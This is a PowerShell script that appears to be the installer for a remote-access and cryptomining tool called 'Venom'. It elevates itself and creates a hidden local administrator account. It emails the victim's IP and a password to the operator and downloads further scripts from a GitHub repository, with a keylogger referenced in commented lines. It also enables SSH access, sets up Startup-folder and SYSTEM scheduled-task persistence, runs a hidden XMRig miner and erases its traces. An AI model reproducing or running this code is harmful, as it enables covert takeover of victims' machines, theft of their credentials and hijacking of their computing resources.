function random_text {
    return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
}

# Check for Administrator Privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    # Create a new local admin account
    Set-Variable -Name username -Value ("...")
    Set-Variable -Name Password -Value (ConvertTo-SecureString ".V3n0m" -AsPlainText -Force)
    New-LocalUser $username -Description "Local admin account created via PowerShell" -FullName "..." -Password $Password
    Add-LocalGroupMember -Member $username -Group "Administrators"
}

# Generate Random Working Directory and Paths
Set-Variable -Name wd -Value (random_text)
Set-Variable -Value ("$env:temp\$wd") -Name path
Set-Variable -Name INITIALPATH -Value (Get-Location)
Set-Variable -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name initial_dir

# Read Email and Password from Files
Set-Variable -Value (Get-Content PkUbTvqXFIdB.txt) -Name email
Set-Variable -Name password -Value (Get-Content NzKnmxLrbsBw.txt)

# Get Network Interface and IP Address
Set-Variable -Value ((Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias) -Name InterfaceAlias
Set-Variable -Name IP -Value ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $InterfaceAlias).IPAddress)

# Save IP Address to File
Set-Variable -Name ipFile -Value ("$initial_dir\ip.txt")
$IP | Out-File -FilePath $ipFile

# Create Configuration File
Set-Variable -Name configfile -Value ("$env:UserName.rat")
Set-Content -Path $configfile -Value ""
Add-Content -Value $IP -Path $configfile
Add-Content -Path $configfile -Value $password
Add-Content -Value $INITIALPATH -Path $configfile
Add-Content -Value $env:temp -Path $configfile

# Convert Secure Password to Plain Text
Set-Variable -Name SecurePassword -Value (ConvertTo-SecureString $password -AsPlainText -Force)
Set-Variable -Name plainPassword -Value ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)))
Add-Content -Value $plainPassword -Path $configfile

# Send Email with Configuration File
Send-MailMessage `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -Force -String $plainPassword -AsPlainText)) `
    -Port 587 `
    -From $email `
    -Subject "IP Address Notification from $env:UserName" `
    -UseSsl `
    -To $email `
    -SmtpServer "smtp.gmail.com" `
    -Attachment $configfile

# Copy and Remove Configuration File
Remove-Item -Path $configfile

# Create and Change to Working Directory
mkdir $path
cd $path

# Download Files
Invoke-WebRequest -OutFile "QyjAaZDBbNPk.reg" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg"
Invoke-WebRequest -OutFile "FoRAUwtxKkSB.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs"
Invoke-WebRequest -OutFile "w.bat" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat"
Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
#Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/keylogger.ps1" -OutFile "KVbOiPPcus.ps1"
#Invoke-WebRequest -OutFile "vaoYIkVglzTJ.cmd" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/controller.cmd"
#Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/fly.ps1" -OutFile "ZYHGCKXWlonm.ps1"
#Invoke-WebRequest -OutFile "AssassinsCreed_SE.exe" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/AssassinsCreed_SE.exe"


# Install and Configure OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -StartupType 'Automatic' -Name sshd
Get-NetFirewallRule -Name *ssh*

# Run Downloaded Scripts
& "./QyjAaZDBbNPk.reg"
& "./FoRAUwtxKkSB.vbs"

# Move RunHidden.vbs and Pause
Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir

Start-Sleep -Seconds 30

# Set-ItemProperty -Name Attributes -Path "$path\vaoYIkVglzTJ.cmd" -Value "Hidden"
# Set-ItemProperty -Name Attributes -Path "$path\KVbOiPPcus.ps1" -Value "Hidden"

# Start-Process -ArgumentList "vaoYIkVglzTJ.cmd" -windowstyle hidden -FilePath "cscript.exe"

# Create New Directory and Change to It
New-Item -ItemType Directory -Name "$wd" -Path "$path"
cd $wd
Set-Variable -Name currentDir -Value ($Pwd)

# Download and Extract XMRig
Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"

Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes

# Replace XMRig Configuration File
Set-Variable -Name newConfigPath -Value ("$path\w.bat")
Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
if (Test-Path -Path $newConfigPath) {
    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
    Write-Output "bat file has been replaced successfully."
} else {
    Write-Output "New bat file not found at the specified path."
}


# Clean Up
Remove-Item -Path "$initial_dir\ip.txt"

# Hide Venom User Directory
Set-Location -Path 'C:\Users'
if (Test-Path -Path '...' -PathType Container) {
    attrib +h +s +r ...
    Write-Output "... directory attributes set to hidden, system, and read-only"
} else {
    Write-Output "... directory does not exist"
    Exit 1
}


cd $path
Remove-Item -Path "w.bat"
Remove-Item -Path "QyjAaZDBbNPk.reg"
Remove-Item -Path "FoRAUwtxKkSB.vbs"

Set-ItemProperty -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "Hidden"

# Set-ItemProperty -Name Attributes -Path "$path\ZYHGCKXWlonm.ps1" -Value "Hidden"

# Start-Process -FilePath "$path\ZYHGCKXWlonm.ps1" -windowstyle hidden

cd $initial_dir

# Start Autorun
Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwjOosKx.vbs"

#Start-Process -windowstyle hidden -ArgumentList "$initial_dir\xmrig-6.22.2\w.bat" -FilePath "cscript.exe"

# Start Rig
# Set execution policy (if needed)
Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
cd "$initial_dir\xmrig-6.22.2"
Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
#Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow -Wait

#Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
& "./TMqhONoBljEv.vbs"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks.ps1" -OutFile "AEQKCPrkuifY.ps1"

Set-ItemProperty -Name Attributes -Path "$initial_dir\AEQKCPrkuifY.ps1" -Value "Hidden"

#create a new task
$TaskName = "winxmon"
$TaskPath = "C:\Windows\System32\Tasks\$TaskName"
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -TaskPath $TaskPath -Principal $Principal -Settings $Settings
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$initial_dir\AEQKCPrkuifY.ps1"
$Trigger = New-ScheduledTaskTrigger -Daily -At 07:00AM
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Start-Process -FilePath "$initial_dir\AEQKCPrkuifY.ps1" -windowstyle hidden

# Pause for 200 seconds
Start-Sleep -Seconds 200

# Delete Installer Script and IP File
Remove-Item -Path "$initial_dir\ip.txt"
Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
# Remove-Item -Path "$path\vaoYIkVglzTJ.cmd"
Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
